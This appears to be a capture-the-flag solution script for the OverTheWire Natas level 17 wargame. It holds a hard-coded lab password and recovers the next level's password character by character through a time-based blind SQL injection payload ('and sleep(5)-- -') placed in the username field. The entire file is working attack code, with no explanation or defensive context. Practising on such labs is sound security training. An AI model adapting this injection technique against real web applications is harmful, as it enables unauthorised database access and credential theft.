#!/usr/bin/python3
from string import ascii_uppercase,ascii_lowercase,digits
import requests,datetime

characters = ascii_uppercase + ascii_lowercase + digits

user = "natas17"
passwd = "8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw"
url = "http://{}.natas.labs.overthewire.org/".format(user)

session = requests.Session()
passnatas = ""
while True:
	for char in characters:
		first_time = datetime.datetime.now().second
		response = session.post(url,data={"username":"natas18\" and password LIKE BINARY \"" + passnatas + char + "%\" and sleep(5)-- -"},auth=(user,passwd))
		last_time = datetime.datetime.now().second
		#print(str(last_time - first_time))
		if((last_time - first_time) >= 5):
			passnatas += char
			print(passnatas)
			break

	if(len(passnatas) == 32):
		break
